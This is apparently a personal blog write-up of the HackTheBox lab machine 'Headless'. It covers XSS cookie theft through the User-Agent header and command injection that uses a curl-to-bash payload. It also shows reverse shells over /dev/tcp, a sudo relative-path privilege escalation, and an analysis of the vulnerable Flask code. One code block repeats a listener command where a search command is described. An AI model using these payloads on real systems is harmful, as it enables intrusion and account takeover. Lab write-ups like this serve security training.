---
layout: article
title: "Headless - HackTheBox Writeup"
date: "2024-05-08"
image: "/assets/img/headless/homepage.png"
tags: ["linux", "website", "xss", "cookies"]
---

Headless is a box in HackTheBox that features XSS vulnerabilities to steal admin cookies and privilege escalation using an unsafe sh script.

Port scan the machine.

<div class="article-code">
{% highlight sh %}
jeanp@~$ nmap -sV -sC 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-08 17:34 EDT
Nmap scan report for 10.10.11.8
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 08 May 2024 21:34:26 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
...
{% endhighlight %}
</div>

We can't SSH into the machine without a password so let's check port 5000 first. The nmap returns a GET HTTP with an `is_admin` cookie set, so let's take a look at the website.

<div class="article-image">
  <img src="/assets/img/headless/homepage.png">
  <p>home page</p>
</div>

We are welcomed with a countdown, and if we click on the button we are taken to a form.

<div class="article-image">
  <img src="/assets/img/headless/supportform.png">
  <p>/support</p>
</div>

If we post data through the form, nothing interesting happens, we just get the same form back.

Let's use dirb now to see what else we can find.

<div class="article-code">
{% highlight sh %}
jeanp@~$ dirb http://10.10.11.8:5000/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May  8 18:24:38 2024
URL_BASE: http://10.10.11.8:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.8:5000/ ----
+ http://10.10.11.8:5000/dashboard (CODE:500|SIZE:265)                                        
+ http://10.10.11.8:5000/support (CODE:200|SIZE:2363)                                         
                                                                                              
-----------------
END_TIME: Wed May  8 18:33:59 2024
DOWNLOADED: 4612 - FOUND: 2
{% endhighlight %}
</div>

We get a 200 for /dashboard

<div class="article-image">
  <img src="/assets/img/headless/unauthorized.png">
</div>

We get an unauthorized message, and we do have the `is_admin` cookie set in our HTTP request, but it's not working. The first thing that comes to mind when we think of stealing cookies is an XSS vulnerability.

There's no much else we can try at this point besides checking the form at /support, so let's go back.

I tested all inputs in the form with a `<script>` tag, and turns out, only when we put this tag in the message box, such that in the payload we pass `message=%3Cscript%3E` using burpsuite, we get the following message.

<div class="article-image">
  <img src="/assets/img/headless/detected.png">
  <p>/support</p>
</div>

Now this is interesting for two reasons:

- Our client information is being sent to administrators.
- Only the headers of our request are being sent, not the payload.

So we can try to steal cookies from the administrators by posting a form with a `<script>` tag in message box, and an additional script in the headers that steals cookies and sends them over to our python server.

So let's first open the python server.

<div class="article-code">
{% highlight sh %}
jeanp@~$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}
</div>

And then we send the form.

<div class="article-image">
  <img src="/assets/img/headless/request.png">
</div>

Notice how the request has a script with the `fetch()` javascript function and `document.cookie` in the `User-Agent` header.

<div class="article-image">
  <img src="/assets/img/headless/admincookie.png">
</div>

After the admin checks our client information, the script executes on their browser and we get their cookie.

Let's try this cookie on /dashboard to see what pops up.

<div class="article-image">
  <img src="/assets/img/headless/setdashboardcookie.png">
</div>

<div class="article-image">
  <img src="/assets/img/headless/admindashboard.png">
  <p>/dashboard</p>
</div>

We are now authorized to get access to the dashboard page. Let's click on the Generate Report button to see what happens.

<div class="article-image">
  <img src="/assets/img/headless/unauthorized.png">
</div>

We get the unauthorized page again. This is due to our cookie switching back to the non-admin one, so let's change the cookie again.

<div class="article-image">
  <img src="/assets/img/headless/dashboardcookie.png">
</div>

And once we send the request we get the following.

<div class="article-image">
  <img src="/assets/img/headless/systemsareup.png">
</div>

Considering we only get a simple message when generating reports, it means that there's not much we can try. The fact that the message says "Systems are up..." suggests that commands are being run on the system when clicking on the button.

I tried different combinations of commands to get a reverse shell and `curl` alongside a pipeline with `bash` is what ended up working. So let's go through the setup.

First, create a script with a reverse shell command.

<div class="article-code">
{% highlight sh %}
jeanp@~$ cat script.sh 
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.142/7777 0>&1'
{% endhighlight %}
</div>

Secondly, open a python http server in the same directory where we created our script.

<div class="article-code">
{% highlight sh %}
jeanp@~$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}
</div>

Thirdly, open a listener with ncat.

<div class="article-code">
{% highlight sh %}
jeanp@~$ nc -lvp 7777
listening on [any] 7777 ...
{% endhighlight %}
</div>

Finally, append a `curl` command to our burpsuite request and pipeline it to `bash`.

<div class="article-image">
  <img src="/assets/img/headless/dashboardrequest.png">
</div>

<div class="article-image">
  <img src="/assets/img/headless/scriptpythonreq.png">
</div>

<div class="article-image">
  <img src="/assets/img/headless/shell.png">
</div>

After sending the request, the server gets the contents of our script, runs them through bash, and executes the reverse shell.

Now we can easily find the user.txt flag by doing one simple command.

<div class="article-code">
{% highlight sh %}
jeanp@~$ nc -lvp 7777
listening on [any] 7777 ...
{% endhighlight %}
</div>

The command starts at the root directory and looks for a file named user.txt, when the lookup encounters directories where permissions are denied, it redirects stderr to `/dev/null`.

<div class="article-image">
  <img src="/assets/img/headless/usertxt.png">
</div>

Let's now look for the root flag.

I always like to start privilege escalation using `sudo -l` to check what root commands we can run with our current user.

<div class="article-image">
  <img src="/assets/img/headless/sudolist.png">
</div>

Looks like we can run a syscheck file with sudo privileges. 

If we concatenate it, we get the following:

<div class="article-code">
{% highlight sh %}
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
{% endhighlight %}
<p>syscheck</p>
</div>

The first line of this script `if [ "$EUID" -ne 0 ]; then exit 1; fi` checks if the user that's running syscheck is root, if its not then it exits.

The next lines are not of much importance, the script just assings values to variables that are then printed to the console.

<div class="article-code">
{% highlight sh %}
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
{% endhighlight %}
</div>

This is the section that is of major interest.

- This block checks if the `initdb.sh` process is running using the `pgrep` command.

- If the process is not found (`pgrep` returns a non-zero exit code), it means the database service is not running.

- In that case, it prints a message indicating that the database service is not running and starts it by executing the `./initdb.sh` script, redirecting stderr to `/dev/null`.

- If the process is found, it means the database service is already running, and it prints a message indicating that.

In Linux, when a script is executed with root privileges (i.e., run by the root user or using sudo), any subsequent scripts or commands invoked by the original script will inherit those same root privileges. This means that if `syscheck` is running with root privileges and it executes `initdb`, then `initdb` will automatically have root privileges as well, regardless of its own file permissions or ownership.

Usually the /usr/bin directory is in PATH, which means any script stored inside this directory can be called from anywhere. We can confirm this by running `echo $PATH`.

<div class="article-image">
  <img src="/assets/img/headless/path.png">
</div>

So let's create an initdb.sh file to get a root shell. My first idea was to assign the setuid bit to /bin/bash.

<div class="article-image">
  <img src="/assets/img/headless/setuid.png">
</div>

But it didn't work, it still required a password.

Let's now try with another reverse shell, this one will be root of course.

<div class="article-code">
{% highlight sh %}
echo "bash -i >& /dev/tcp/10.10.14.142/7777 0>&1" > initdb.sh
{% endhighlight %}
</div>

And make the script executable.

<div class="article-code">
{% highlight sh %}
chmod +x initdb.sh
{% endhighlight %}
</div>

And finally, we run syscheck with sudo.

<div class="article-code">
{% highlight sh %}
sudo syscheck
{% endhighlight %}
</div>

<div class="article-image">
  <img src="/assets/img/headless/rootshell.png">
</div>

<div class="article-image">
  <img src="/assets/img/headless/rootflag.png">
</div>

We get the shell and the root flag.

<h4>Post Explotation</h4>

It's always important to not only know how to exploit applications, but to also understand why and where they are vulnerable to provide better security.

If we list the home directory of the vulnerable machine we find the `app.py` file that's responsible for launching the vulnerable website on port 5000.

Let's inspect the vulnerable sections of this code from top to bottom. I added some comments to make it more clear.

<div class="article-code">
{% highlight python %}
from flask import Flask, render_template, request, make_response, abort, send_file
from itsdangerous import URLSafeSerializer
import os
import random

app = Flask(__name__, template_folder=".")


# Set a bytes object to the secret key attribute of the app instance
app.secret_key = b'PcBE2u6tBomJmDMwUbRzO18I07A'
# Serialize the data with the secret key
serializer = URLSafeSerializer(app.secret_key)


@app.route('/')
def index():
    # Get the Remote_Addr header from the request
    client_ip = request.remote_addr
    # Check if the request comes from localhost, if it's grant them admin cookie.
    # Otherwise give them user cookie.
    is_admin = True if client_ip in ['127.0.0.1', '::1'] else False
    token = "admin" if is_admin else "user"
    # Serialize "admin" or "user" with the secret key.
    serialized_value = serializer.dumps(token)
    
    # Make the reponse and assign a value to the 'is_admin' cookie.
    response = make_response(render_template('index.html', is_admin=token))
    response.set_cookie('is_admin', serialized_value, httponly=False)

    return response
{% endhighlight %}
</div>

From this block we can see where the cookies are coming from and how they are being generated. We can add some code to print both the user and admin cookies.

<div class="article-code">
{% highlight python %}
# Set a bytes object to the secret key attribute of the app instance
app.secret_key = b'PcBE2u6tBomJmDMwUbRzO18I07A'
# Serialize the data with a secret key
serializer = URLSafeSerializer(app.secret_key)

serialized_value = serializer.dumps("user")
print("Serialized User Cookie:", serialized_value)

serialized_value = serializer.dumps("admin")
print("Serialized Admin Cookie:", serialized_value)
{% endhighlight %}
</div>

<div class="article-code">
{% highlight sh %}
jeanp@~$ python app.py
Serialized User Cookie: InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Serialized Admin Cookie: ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
{% endhighlight %}
</div>

Let's now inspect the /dashboard route code.

<div class="article-code">
{% highlight python %}
@app.route('/dashboard', methods=['GET', 'POST'])
def admin():
    # If the cookie in the request is the user cookie abort with Unauthorized 401
    if serializer.loads(request.cookies.get('is_admin')) == "user":
        return abort(401)

    # Variable where the output of the command will be stored.
    script_output = ""

    if request.method == 'POST':
        # Get the date from the user's input
        date = request.form.get('date')
        if date:
            # VULNERABLE CODE
            script_output = os.popen(f'bash report.sh {date}').read()

    return render_template('dashboard.html', script_output=script_output)
{% endhighlight %}
</div>

`os.popen(f'bash report.sh {date}').read()`. It's not a good idea to pass input to a shell without sanitizing it first. It makes sense now why passing `date=2023-09-15;curl http://10.10.14.142:8000/script.sh | bash` in the payload works to get a reverse shell going. This payload translates to `bash report.sh 2023-09-15;curl http://10.10.14.142:8000/script.sh | bash`.






























































































